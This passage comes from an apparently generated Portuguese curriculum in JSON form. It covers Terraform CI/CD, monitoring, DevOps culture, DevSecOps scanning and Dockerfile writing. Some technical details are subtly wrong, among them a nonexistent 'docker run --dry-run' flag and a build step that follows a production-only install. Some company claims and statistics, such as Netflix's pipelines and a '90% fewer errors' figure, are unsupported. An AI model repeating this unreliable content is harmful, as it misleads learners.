                                  "stepNumber": 4,
                                  "title": "Testar Idempotência e Integrar com Pipeline Ágil",
                                  "subSteps": [
                                    "Configurar backend S3 para estado remoto em backend.tf.",
                                    "Criar workflow GitHub Actions para CI/CD com terraform plan/apply.",
                                    "Rodar múltiplos applies para verificar idempotência.",
                                    "Simular mudança ágil: alterar variável e deploy via PR.",
                                    "Adicionar tflint e tfsec para linting no pipeline."
                                  ],
                                  "verification": "Pipeline roda com sucesso, plan mostra mudanças apenas quando alterado, e infra persiste idempotentemente.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Conta GitHub",
                                    "Bucket S3 para state",
                                    "GitHub Actions marketplace actions para Terraform"
                                  ],
                                  "tips": "Use workspaces para ambientes (dev/staging/prod) em fluxos ágeis.",
                                  "learningObjective": "Alinhar IaC a ciclos ágeis com automação CI/CD idempotente.",
                                  "commonMistakes": [
                                    "Estado local em equipes colaborativas",
                                    "Pipeline sem aprovação manual em prod",
                                    "Ignorar destroy plan para cleanup"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e Otimizar para Produção",
                                  "subSteps": [
                                    "Adicionar dados sources para recursos existentes (ex: VPC default).",
                                    "Implementar dependências explícitas com depends_on.",
                                    "Executar 'terraform validate' e 'terraform fmt'.",
                                    "Testar destroy e re-apply para full idempotência.",
                                    "Documentar em README.md passos de deploy ágil."
                                  ],
                                  "verification": "'terraform destroy -auto-approve' seguido de apply recria infra idêntica.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Ferramentas: tflint, tfsec, Checkov",
                                    "README template"
                                  ],
                                  "tips": "Monitore custos AWS durante testes para evitar surpresas.",
                                  "learningObjective": "Otimizar IaC para cenários de produção robustos e ágeis.",
                                  "commonMistakes": [
                                    "Dependências implícitas causando ordem errada",
                                    "Não formatar código",
                                    "Falta de documentação para onboarding"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um módulo Terraform para provisionar uma VPC na AWS com 2 subnets públicas e 2 privadas, IGW, NAT Gateway, versionado no GitHub. Integre com GitHub Actions: plan em PRs, apply em merges to main. Teste idempotência rodando apply 3x sem mudanças.",
                              "finalVerifications": [
                                "terraform plan mostra 'No changes' após apply múltiplos.",
                                "Pipeline CI/CD deploya infra em <5min de PR merge.",
                                "Módulos são reusáveis em novos projetos sem recodificação.",
                                "Estado remoto no S3 com locking DynamoDB ativo.",
                                "tfsec scan passa sem vulnerabilidades de segurança.",
                                "Destroy e re-apply recria recursos idênticos."
                              ],
                              "assessmentCriteria": [
                                "Código HCL é idempotente e versionado corretamente (80% peso).",
                                "Integração CI/CD ágil funciona em fluxos reais (15% peso).",
                                "Uso de melhores práticas: módulos, variáveis, linting (5% peso).",
                                "Documentação clara e verificações finais implementadas.",
                                "Nenhum erro de segurança ou custo descontrolado em testes."
                              ],
                              "crossCurricularConnections": [
                                "Programação: HCL como DSL declarativa similar a YAML/JSON.",
                                "Gerenciamento Ágil: Integração com Scrum/Kanban via CI/CD.",
                                "Segurança da Informação: Políticas IAM e least privilege em IaC.",
                                "Administração de Sistemas: Automação de provisionamento cloud.",
                                "Desenvolvimento de Software: GitOps e colaboração em repositórios."
                              ],
                              "realWorldApplication": "Em times DevOps de empresas como Nubank ou iFood, IaC com Terraform permite deploy de clusters Kubernetes em minutos durante sprints ágeis, reduzindo erros manuais em 90% e suportando scaling elástico para Black Friday."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.2.1"
                            ]
                          },
                          {
                            "id": "10.1.4.3.3.2",
                            "name": "Configurar monitoramento e feedback",
                            "description": "Implementar ferramentas como Prometheus, Grafana ou CloudWatch para métricas em tempo real, integrando com loops de feedback ágil para melhorias contínuas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Selecionar e Planejar Ferramentas de Monitoramento",
                                  "subSteps": [
                                    "Avalie o ambiente de nuvem (ex: AWS, GCP, Azure) e selecione ferramentas adequadas: Prometheus para coleta open-source, Grafana para visualização ou CloudWatch para nativo AWS.",
                                    "Defina métricas chave: latência, tráfego, erros e saturação (golden signals).",
                                    "Crie um diagrama de arquitetura mostrando agentes de coleta, storage e dashboards.",
                                    "Configure autenticação e permissões para as ferramentas.",
                                    "Planeje alertas baseados em thresholds críticos."
                                  ],
                                  "verification": "Diagrama de arquitetura documentado e lista de métricas priorizadas aprovada.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Documentação oficial de Prometheus/Grafana/CloudWatch",
                                    "Ferramentas de diagramação como Draw.io",
                                    "Conta em nuvem ativa"
                                  ],
                                  "tips": "Comece com métricas essenciais para evitar sobrecarga inicial.",
                                  "learningObjective": "Entender como mapear necessidades de monitoramento a ferramentas específicas.",
                                  "commonMistakes": "Escolher ferramentas sem considerar compatibilidade com o stack existente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Coleta de Métricas em Tempo Real",
                                  "subSteps": [
                                    "Instale exporters ou agents (ex: Node Exporter para Prometheus ou agente CloudWatch).",
                                    "Configure scrape jobs no Prometheus ou métricas customizadas no CloudWatch.",
                                    "Teste coleta inicial enviando tráfego simulado à aplicação.",
                                    "Armazene métricas em banco de dados compatível (Prometheus TSDB ou CloudWatch Logs).",
                                    "Habilite métricas de aplicação via SDKs (ex: Prometheus client libraries)."
                                  ],
                                  "verification": "Métricas sendo coletadas e visíveis na interface da ferramenta (ex: Prometheus UI mostra targets up).",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Servidor ou instância EC2 para Prometheus",
                                    "Docker para containers leves",
                                    "Chaves API da nuvem"
                                  ],
                                  "tips": "Use Docker Compose para setups rápidos e isolados.",
                                  "learningObjective": "Implementar coleta automatizada de métricas de infraestrutura e aplicação.",
                                  "commonMistakes": "Configurações de scrape intervalos muito baixos causando alta carga no sistema."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Visualização, Dashboards e Alertas",
                                  "subSteps": [
                                    "Instale e conecte Grafana ao Prometheus/CloudWatch como data source.",
                                    "Crie dashboards personalizados com painéis para CPU, memória, latência e erros.",
                                    "Configure regras de alerta (ex: Prometheus Alertmanager ou CloudWatch Alarms).",
                                    "Integre notificações com Slack, email ou PagerDuty.",
                                    "Teste alertas simulando falhas (ex: alto CPU via stress tool)."
                                  ],
                                  "verification": "Dashboards atualizando em tempo real e alertas disparando corretamente em testes.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": [
                                    "Grafana OSS",
                                    "Templates de dashboards oficiais",
                                    "Ferramentas de stress como Apache Bench"
                                  ],
                                  "tips": "Use queries PromQL ou CloudWatch Metrics Explorer para filtros eficientes.",
                                  "learningObjective": "Criar visualizações acionáveis e sistemas de alerta proativos.",
                                  "commonMistakes": "Dashboards sobrecarregados com métricas irrelevantes, dificultando análise."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Monitoramento com Loops de Feedback Ágil",
                                  "subSteps": [
                                    "Conecte métricas a ferramentas ágeis (ex: Jira, Trello via webhooks de alertas).",
                                    "Defina SLOs/SLIs baseados em métricas e revise em retrospectives.",
                                    "Automatize relatórios semanais de performance via scripts ou Grafana annotations.",
                                    "Implemente feedback loops: alertas → análise → deploy de fixes via CI/CD.",
                                    "Monitore eficácia do loop medindo tempo de resolução de incidentes."
                                  ],
                                  "verification": "Alertas integrados geram tickets automáticos e relatórios acessíveis à equipe.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Webhooks em Jira/Slack",
                                    "Scripts Python para automação",
                                    "Pipeline CI/CD como GitHub Actions"
                                  ],
                                  "tips": "Mantenha loops curtos: detecção → ação em <1 hora.",
                                  "learningObjective": "Fechar o ciclo de monitoramento com melhorias contínuas via DevOps.",
                                  "commonMistakes": "Ignorar métricas de negócios, focando só em técnicas."
                                }
                              ],
                              "practicalExample": "Em uma aplicação web de e-commerce na AWS, configure CloudWatch para monitorar latência de APIs (alvo <200ms), uso de CPU (>80% alerta), erros 5xx e tráfego. Integre alarmes com SNS para notificações no Slack, que criam issues no Jira para revisão no daily standup, permitindo deploy de otimizações em horas.",
                              "finalVerifications": [
                                "Métricas em tempo real visíveis em dashboard acessível pela equipe.",
                                "Alertas testados disparam notificações corretas.",
                                "Integração com ferramentas ágeis gera ações rastreáveis.",
                                "SLOs definidos e monitorados (ex: 99.9% uptime).",
                                "Relatórios automáticos de performance semanais.",
                                "Tempo médio de resolução de incidentes <30 minutos."
                              ],
                              "assessmentCriteria": [
                                "Cobertura completa dos golden signals com precisão >95%.",
                                "Dashboards intuitivos e customizáveis sem lags.",
                                "Alertas com baixa taxa de falsos positivos (<5%).",
                                "Integração seamless com CI/CD e agile tools.",
                                "Documentação clara de configuração e troubleshooting.",
                                "Escalabilidade demonstrada em load test."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Ágil: Integração com retrospectives e kanban.",
                                "Análise de Dados: Uso de queries para insights preditivos.",
                                "Segurança da Informação: Monitoramento de logs de segurança.",
                                "Arquitetura de Software: Otimização baseada em métricas de performance."
                              ],
                              "realWorldApplication": "Empresas como Netflix usam Prometheus e Grafana para monitorar Chaos Engineering, detectando gargalos em microservices e integrando com Spinnaker para deploys autônomos, mantendo 99.99% de disponibilidade global."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.3.1"
                            ]
                          },
                          {
                            "id": "10.1.4.3.3.3",
                            "name": "Promover cultura DevOps colaborativa",
                            "description": "Estabelecer práticas de compartilhamento de responsabilidades usando ferramentas como Slack bots e dashboards compartilhados em ambientes cloud multi-time.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar o estado atual da colaboração na equipe",
                                  "subSteps": [
                                    "Realize uma pesquisa anônima com a equipe sobre práticas atuais de compartilhamento de responsabilidades.",
                                    "Analise métricas existentes como tempo de resolução de incidentes e frequência de comunicações.",
                                    "Identifique gaps em ferramentas de colaboração e silos departamentais.",
                                    "Mapeie os times envolvidos (dev, ops, QA) e suas interações atuais.",
                                    "Documente um relatório inicial com achados e propostas de melhoria."
                                  ],
                                  "verification": "Relatório de avaliação aprovado pela equipe e stakeholders.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Ferramentas de survey como Google Forms ou Microsoft Forms",
                                    "Acesso a logs de ferramentas existentes (Jira, Slack)"
                                  ],
                                  "tips": "Garanta anonimato nas pesquisas para respostas honestas.",
                                  "learningObjective": "Compreender o nível atual de colaboração para definir baselines.",
                                  "commonMistakes": [
                                    "Ignorar feedback de times operacionais",
                                    "Focar apenas em métricas técnicas sem considerar cultura"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir princípios e práticas DevOps colaborativos",
                                  "subSteps": [
                                    "Estabeleça princípios como 'shared responsibility' e 'automação de comunicações'.",
                                    "Crie um charter DevOps com regras claras para compartilhamento de responsabilidades.",
                                    "Defina KPIs colaborativos como MTTR (Mean Time to Recovery) compartilhado.",
                                    "Alinhe com metodologias ágeis como blameless post-mortems.",
                                    "Obtenha buy-in de líderes de time através de workshops."
                                  ],
                                  "verification": "Charter DevOps assinado por todos os membros da equipe.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Templates de charter DevOps (GitHub repos)",
                                    "Ferramentas de colaboração como Miro ou Jamboard"
                                  ],
                                  "tips": "Use exemplos reais de empresas como Google SRE para inspirar.",
                                  "learningObjective": "Estabelecer fundamentos culturais para DevOps.",
                                  "commonMistakes": [
                                    "Princípios muito genéricos sem métricas",
                                    "Falta de envolvimento de todos os níveis hierárquicos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar ferramentas de colaboração como Slack bots e dashboards",
                                  "subSteps": [
                                    "Instale e configure um bot Slack para notificações automáticas de pipelines CI/CD (ex: usando AWS Chatbot ou Zapier).",
                                    "Crie dashboards compartilhados em ferramentas como Grafana ou Datadog conectados a ambientes cloud multi-time (AWS, Azure).",
                                    "Integre alertas de falhas e métricas de performance em canais dedicados.",
                                    "Teste integrações em ambiente de staging.",
                                    "Treine a equipe no uso inicial das ferramentas."
                                  ],
                                  "verification": "Bots e dashboards funcionando com alertas simulados recebidos.",
                                  "estimatedTime": "6 horas",
                                  "materials": [
                                    "Acesso a Slack Workspace",
                                    "Contas em clouds (AWS, Azure)",
                                    "Ferramentas: Grafana Cloud, AWS Chatbot"
                                  ],
                                  "tips": "Comece com integrações simples para evitar sobrecarga.",
                                  "learningObjective": "Implementar infraestrutura técnica para colaboração em tempo real.",
                                  "commonMistakes": [
                                    "Configurações sem autenticação segura",
                                    "Dashboards sobrecarregados com dados irrelevantes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Promover adoção e monitorar a cultura colaborativa",
                                  "subSteps": [
                                    "Realize workshops hands-on para uso das ferramentas e práticas.",
                                    "Estabeleça rituais como daily stand-ups com foco em compartilhamento.",
                                    "Monitore adoção via métricas de uso (mensagens no Slack, views em dashboards).",
                                    "Colete feedback contínuo e ajuste práticas.",
                                    "Celebre vitórias colaborativas para reforçar a cultura."
                                  ],
                                  "verification": "Relatório de adoção mostrando >80% de engajamento semanal.",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Plataforma de workshops (Zoom, Teams)",
                                    "Ferramentas de analytics do Slack/Grafana"
                                  ],
                                  "tips": "Use gamificação como leaderboards para engajamento.",
                                  "learningObjective": "Garantir adoção sustentável e melhoria contínua.",
                                  "commonMistakes": [
                                    "Falta de follow-up após treinamentos",
                                    "Ignorar resistência cultural"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma startup desenvolvendo e-commerce na AWS, configure um Slack bot que alerta falhas em deploys Kubernetes e um dashboard Grafana compartilhado mostrando uptime multi-região, permitindo que devs e ops resolvam issues em minutos via chat colaborativo.",
                              "finalVerifications": [
                                "Equipe demonstra uso ativo de bots e dashboards em reuniões.",
                                "Redução mensurável em MTTR para incidentes.",
                                "Feedback positivo em surveys de cultura (>4/5).",
                                "Aumento na frequência de compartilhamento cross-time.",
                                "Integrações técnicas estáveis sem downtime.",
                                "Relatórios de post-mortem blameless adotados."
                              ],
                              "assessmentCriteria": [
                                "Nível de engajamento da equipe nas ferramentas (métricas de uso).",
                                "Eficácia na redução de silos (feedback qualitativo).",
                                "Qualidade das configurações técnicas (uptime e alertas precisos).",
                                "Sustentabilidade das práticas (retenção após 1 mês).",
                                "Impacto em KPIs DevOps (deploy frequency, MTTR).",
                                "Capacidade de iteração baseada em dados."
                              ],
                              "crossCurricularConnections": [
                                "Gestão Ágil de Projetos (integração com Scrum/Kanban).",
                                "Comunicação Organizacional (ferramentas de team building).",
                                "Administração de Nuvem (integrações AWS/Azure/GCP).",
                                "Segurança da Informação (alertas de compliance).",
                                "Liderança e Cultura Organizacional."
                              ],
                              "realWorldApplication": "Em empresas como Netflix ou Spotify, essa cultura DevOps colaborativa via bots e dashboards permite milhares de deploys diários com alta confiabilidade, reduzindo custos operacionais e acelerando time-to-market em ambientes cloud híbridos."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.3.1"
                            ]
                          },
                          {
                            "id": "10.1.4.3.3.4",
                            "name": "Gerenciar segurança em DevSecOps",
                            "description": "Incorporar scans de vulnerabilidades (SAST/DAST) em pipelines CI/CD com ferramentas como SonarQube, garantindo segurança ágil na nuvem.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Fundamentos de DevSecOps e Tipos de Scans",
                                  "subSteps": [
                                    "Estude os princípios de DevSecOps e como 'shift left' integra segurança no ciclo de desenvolvimento.",
                                    "Diferencie SAST (análise estática, código fonte) de DAST (análise dinâmica, app rodando).",
                                    "Revise vulnerabilidades comuns OWASP Top 10 e métricas de qualidade SonarQube (code smells, bugs, security hotspots).",
                                    "Analise exemplos de falhas de segurança em pipelines sem DevSecOps.",
                                    "Mapeie o fluxo de um pipeline CI/CD típico com pontos de inserção de scans."
                                  ],
                                  "verification": "Resuma em um diagrama os tipos de scans e seu lugar no pipeline, confirmando com autoavaliação.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação SonarQube",
                                    "OWASP Top 10 PDF",
                                    "Vídeo introdutório DevSecOps (YouTube ou Coursera)"
                                  ],
                                  "tips": "Use mind maps para visualizar integrações; foque em cenários ágeis.",
                                  "learningObjective": "Identificar e explicar como SAST/DAST melhoram segurança em pipelines CI/CD.",
                                  "commonMistakes": [
                                    "Confundir SAST com DAST",
                                    "Ignorar métricas além de vulnerabilidades",
                                    "Subestimar impacto em performance do pipeline"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar e Configurar SonarQube Localmente ou na Nuvem",
                                  "subSteps": [
                                    "Baixe e instale SonarQube Community Edition via Docker ou instância AWS EC2.",
                                    "Configure banco de dados (PostgreSQL/H2) e gere token de autenticação.",
                                    "Acesse a UI web (porta 9000) e crie um projeto de qualidade gate inicial.",
                                    "Instale SonarScanner CLI e configure sonar-project.properties no repositório.",
                                    "Execute scan manual inicial em um projeto de teste para validar setup."
                                  ],
                                  "verification": "Scan manual gera relatório sem erros e exibe métricas no dashboard SonarQube.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Docker Desktop",
                                    "SonarQube Docker image",
                                    "Repositório Git de teste (ex: petclinic)",
                                    "AWS Free Tier (opcional)"
                                  ],
                                  "tips": "Use Docker para setup rápido; habilite autenticação básica desde o início.",
                                  "learningObjective": "Configurar ambiente SonarQube funcional para scans SAST/DAST.",
                                  "commonMistakes": [
                                    "Ports não expostas corretamente",
                                    "Token inválido",
                                    "Falta de configuração de quality gates"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar SAST no Pipeline CI/CD com SonarQube",
                                  "subSteps": [
                                    "Escolha um CI/CD tool (GitHub Actions/Jenkins) e crie workflow YAML básico.",
                                    "Adicione step SonarScanner com parâmetros (projectKey, hostUrl, token).",
                                    "Configure quality gate wait para falhar build se não passar.",
                                    "Teste push de código com vulnerabilidade intencional (ex: SQL injection).",
                                    "Otimize com cache de dependências para acelerar scans."
                                  ],
                                  "verification": "Pipeline executa SAST, detecta issue e bloqueia deploy até fix.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "GitHub repo com app Java/Node.js",
                                    "GitHub Actions docs",
                                    "SonarCloud (alternativa gratuita)"
                                  ],
                                  "tips": "Use SonarCloud para nuvem sem setup local; debug logs verbose.",
                                  "learningObjective": "Incorporar SAST automatizado em pipelines para detecção early de vulnerabilidades.",
                                  "commonMistakes": [
                                    "Variáveis de ambiente não setadas",
                                    "Quality gate não aguardada",
                                    "Scan sem branch analysis"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Incorporar DAST e Configurar Políticas de Segurança Ágeis",
                                  "subSteps": [
                                    "Integre ferramenta DAST como OWASP ZAP no pipeline pós-build/deploy.",
                                    "Configure SonarQube para ingestão de relatórios DAST via API ou plugins.",
                                    "Defina thresholds em quality profiles (ex: block critical vulnerabilities).",
                                    "Adicione notificações Slack/Teams para falhas de segurança.",
                                    "Implemente branching strategy com scans em PRs."
                                  ],
                                  "verification": "DAST scan roda em ambiente staging e falha pipeline se vulnerabilidades encontradas.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "OWASP ZAP Docker",
                                    "SonarQube API docs",
                                    "Pipeline YAML template"
                                  ],
                                  "tips": "Rode DAST em container isolado; use scans leves para CI, completos para CD.",
                                  "learningObjective": "Combinar SAST/DAST com gates para segurança end-to-end em nuvem.",
                                  "commonMistakes": [
                                    "DAST em ambiente prod",
                                    "Thresholds muito permissivos",
                                    "Falta de false positive handling"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar Pipeline Completo, Monitorar e Otimizar",
                                  "subSteps": [
                                    "Execute end-to-end: commit > PR > scan > merge > deploy.",
                                    "Monitore dashboard SonarQube por trends (debt, coverage).",
                                    "Configure webhooks para integração com ferramentas como Jira.",
                                    "Realize remediation de issues detectados e re-teste.",
                                    "Documente SOP para manutenção contínua."
                                  ],
                                  "verification": "Pipeline passa com código limpo e falha com issues; métricas melhoram em 20%.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Projeto real ou simulado",
                                    "SonarQube webhooks guide",
                                    "Jira/Slack integration docs"
                                  ],
                                  "tips": "Automatize relatórios semanais; priorize hotspots de segurança.",
                                  "learningObjective": "Validar e manter DevSecOps pipeline ágil e escalável.",
                                  "commonMistakes": [
                                    "Ignorar histórico de scans",
                                    "Sem rollback plan",
                                    "Overlooking performance impact"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app web Node.js hospedado na AWS (EC2 + EKS), configure GitHub Actions: on push/PR, rode SAST com SonarQube detectando XSS/SQLi, quality gate bloqueia merge, DAST via ZAP em staging testa API endpoints, garantindo deploy seguro só após aprovação.",
                              "finalVerifications": [
                                "Pipeline CI/CD executa SAST/DAST automaticamente em todo commit/PR.",
                                "Quality gates bloqueiam deploys com vulnerabilidades críticas/altas.",
                                "Dashboard SonarQube mostra redução de hotspots de segurança >30%.",
                                "Relatórios DAST são ingeridos e acionáveis no SonarQube.",
                                "Tempo total de scan <5min, sem impactar velocity ágil.",
                                "Notificações alertam equipe sobre falhas de segurança."
                              ],
                              "assessmentCriteria": [
                                "Precisão de detecção: Scans identificam 90%+ OWASP Top 10 simuladas.",
                                "Integração seamless: Zero falhas manuais no pipeline end-to-end.",
                                "Configuração de gates: Thresholds alinhados a políticas de risco.",
                                "Performance: Scans não excedem 10% do tempo total de build.",
                                "Documentação: Guia passo-a-passo para setup e troubleshooting.",
                                "Escalabilidade: Funciona em branches múltiplas e multi-projetos."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento Ágil na Nuvem: Integra com sprints e CI/CD contínuo.",
                                "Arquitetura de Software: Alinha com design secure-by-default.",
                                "Gestão de Infraestrutura como Código: Scans em IaC (Terraform).",
                                "Análise de Riscos e Compliance: Suporte a GDPR/SOC2 via relatórios.",
                                "Monitoramento e Observability: Dashboards integrados com Prometheus/Grafana."
                              ],
                              "realWorldApplication": "Na Netflix, DevSecOps com SonarQube + Spinnaker em pipelines Chaos Monkey garante scans SAST/DAST em milhares de deploys diários na AWS, reduzindo MTTR de vulnerabilidades de dias para horas, mantendo 99.99% uptime seguro."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.3.2.2",
                              "10.1.4.3.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.4.4",
                    "name": "Deploy e Orquestração de Aplicações",
                    "description": "Processos de implantação utilizando containers e ferramentas como Docker e Kubernetes.",
                    "individualConcepts": [
                      {
                        "id": "10.1.4.4.1",
                        "name": "Containerização com Docker",
                        "description": "Fundamentos da containerização de aplicações utilizando Docker, incluindo criação de imagens, gerenciamento de containers e processos de build e run para implantação em ambientes de nuvem.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.4.1.1",
                            "name": "Criar um Dockerfile",
                            "description": "Escrever um Dockerfile completo para uma aplicação web, especificando base image, cópia de arquivos, instalação de dependências, exposição de portas e comandos de inicialização.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Selecionar e Declarar a Imagem Base",
                                  "subSteps": [
                                    "Identifique o runtime da aplicação web (ex: Node.js, Python, Java)",
                                    "Acesse o Docker Hub e busque imagens oficiais otimizadas (ex: node:18-alpine para leveza)",
                                    "Escreva a instrução FROM com versão específica e considere multi-stage para produção",
                                    "Adicione WORKDIR para definir o diretório de trabalho",
                                    "Salve o arquivo como Dockerfile no root do projeto"
                                  ],
                                  "verification": "Execute 'docker pull <imagem>' para confirmar disponibilidade e verifique se o Dockerfile inicia com FROM válida.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Docker Hub (hub.docker.com)",
                                    "Editor de texto (VS Code com extensão Docker)",
                                    "Documentação oficial Docker"
                                  ],
                                  "tips": "Prefira tags específicas como '18-alpine' em vez de 'latest' para reprodutibilidade e segurança.",
                                  "learningObjective": "Compreender a importância da imagem base na definição do ambiente de execução.",
                                  "commonMistakes": [
                                    "Usar 'latest' sem pin, levando a builds inconsistentes",
                                    "Escolher imagens grandes desnecessariamente, aumentando tempo de download"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Copiar Arquivos de Dependências e Instalar Pacotes",
                                  "subSteps": [
                                    "Crie um .dockerignore para excluir node_modules, .git e arquivos desnecessários",
                                    "Escreva COPY package*.json ./ para copiar apenas manifests de dependências",
                                    "Adicione RUN npm ci --only=production (ou equivalente para outras linguagens)",
                                    "Otimize layers copiando package.json antes do código fonte",
                                    "Teste localmente com docker build para verificar instalação"
                                  ],
                                  "verification": "Após build parcial, verifique logs do RUN para ausência de erros de instalação.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    ".dockerignore template",
                                    "package.json do projeto exemplo",
                                    "npm/yarn docs"
                                  ],
                                  "tips": "Use 'npm ci' para installs determinísticos em produção, mais rápido que 'npm install'.",
                                  "learningObjective": "Aprender otimização de layers para builds eficientes e caches Docker.",
                                  "commonMistakes": [
                                    "Copiar todo o código antes de instalar deps, invalidando cache sempre",
                                    "Esquecer .dockerignore, inchando a imagem"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Copiar Código Fonte e Configurar Build",
                                  "subSteps": [
                                    "Adicione COPY . . após instalação de deps para copiar o resto do código",
                                    "Inclua RUN npm run build se a app requer build (ex: React/Vue)",
                                    "Configure variáveis de ambiente com ENV (ex: ENV NODE_ENV=production)",
                                    "Adicione USER node para segurança (não root)",
                                    "Verifique estrutura de arquivos com ls no Dockerfile via RUN"
                                  ],
                                  "verification": "Build completo deve copiar arquivos sem erros de permissão ou paths.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Código fonte da app web exemplo",
                                    "Dockerfile parcial do step anterior"
                                  ],
                                  "tips": "Copie código só após deps para maximizar cache de layers.",
                                  "learningObjective": "Dominar cópia segura e configuração de ambiente não-root.",
                                  "commonMistakes": [
                                    "Rodar como root, risco de segurança",
                                    "Copiar arquivos desnecessários como testes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Expor Portas e Definir Comando de Inicialização",
                                  "subSteps": [
                                    "Adicione EXPOSE <porta> (ex: 3000) para documentar portas usadas",
                                    "Inclua HEALTHCHECK para monitoramento (ex: curl localhost:3000)",
                                    "Escreva CMD [\"npm\", \"start\"] em formato exec (array) para sinalização correta",
                                    "Considere ENTRYPOINT para scripts customizados",
                                    "Salve e valide sintaxe com 'docker run --dry-run'"
                                  ],
                                  "verification": "Container roda com 'docker run -p 3000:3000 <image>' e responde em localhost:3000.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentação Docker CMD/EXPOSE",
                                    "Ferramenta curl ou browser"
                                  ],
                                  "tips": "Use formato JSON array em CMD para evitar shell e lidar com sinais como SIGTERM.",
                                  "learningObjective": "Configurar runtime production-ready com portas e healthchecks.",
                                  "commonMistakes": [
                                    "Usar shell form em CMD, causando problemas com PID 1",
                                    "EXPOSE sem -p no run"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Otimizar o Dockerfile Completo",
                                  "subSteps": [
                                    "Execute docker build -t minha-app .",
                                    "Rode docker run -p 3000:3000 minha-app e teste endpoints",
                                    "Analise docker image inspect para tamanho e layers",
                                    "Otimize com multi-stage se aplicável (ex: build stage separada)",
                                    "Push para registry e teste pull remoto"
                                  ],
                                  "verification": "Imagem builda, roda sem erros e app responde corretamente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Docker CLI instalado",
                                    "App web de teste rodando localmente"
                                  ],
                                  "tips": "Use docker history <image> para ver layers e otimizar ordem.",
                                  "learningObjective": "Validar e refinar Dockerfile para uso em produção.",
                                  "commonMistakes": [
                                    "Ignorar warnings de deprecated instructions",
                                    "Não testar em ambiente limpo"
                                  ]
                                }
                              ],
                              "practicalExample": "Para uma API Node.js Express:\nFROM node:18-alpine\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\nCOPY . .\nRUN npm run build\nEXPOSE 3000\nUSER node\nHEALTHCHECK --interval=30s CMD wget --no-verbose --tries=1 --spider http://localhost:3000/health || exit 1\nCMD [\"npm\", \"start\"]",
                              "finalVerifications": [
                                "Dockerfile builda sem erros: docker build -t test .",
                                "Container inicia e expõe porta corretamente: docker run -p 3000:3000 test",
                                "App responde a requests: curl http://localhost:3000",
                                "Imagem é leve (<500MB) e segura (não root)",
                                "Healthcheck passa após inicialização",
                                "docker history mostra layers otimizados"
                              ],
                              "assessmentCriteria": [
                                "Uso correto de FROM com imagem mínima e versionada",
                                "Separação de COPY deps e código para cache eficiente",
                                "Inclusão de .dockerignore implícita ou explícita",
                                "CMD em formato exec array com sinalização adequada",
                                "EXPOSE e HEALTHCHECK presentes",
                                "Otimizações como multi-stage ou USER não-root"
                              ],
                              "crossCurricularConnections": [
                                "DevOps: Integração com CI/CD pipelines (GitHub Actions, Jenkins)",
                                "Cloud Computing: Deploy em Kubernetes ou ECS com imagens Docker",
                                "Segurança da Informação: Práticas de least privilege (USER node)",
                                "Desenvolvimento Ágil: Padronização de ambientes dev/test/prod",
                                "Administração de Sistemas: Gerenciamento de registries privados"
                              ],
